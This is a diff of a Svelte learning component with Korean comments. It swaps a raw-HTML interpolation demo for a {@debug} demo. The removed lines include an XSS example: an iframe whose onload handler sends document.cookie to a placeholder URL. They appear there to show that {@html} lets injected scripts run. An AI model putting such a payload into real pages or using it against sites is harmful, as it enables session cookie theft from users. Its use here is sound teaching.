@@ -1,12 +1,11 @@
-<!-- Svelte에 원시 HTML 작성하기 -->
+<!-- 디버그 -->
 
 <script>
-    let h1 = '<h1>Hello ttoobi</h1>'
-    let xss = '<iframe onload="document.location=`https://?${document.cookie}`"></iframe>'
-
-    // 외부에서 작성한 자바스크립트가 실행될 수 있다
+    let name = 'ttoobi'
+    let index = 0
 </script>
 
-{@html h1}
-<!-- at-sign html을 넣어서 html로 해석할 수 있게 보간 -->
-{@html xss}
+{@debug index, name}
+<!-- 보간에 작성된 데이터가 변경될 때마다 콘솔에 해당하는 내용을 출력한다. -->
+
+<h1 on:click={() => {index += 1}}>Hello {name}!</h1>
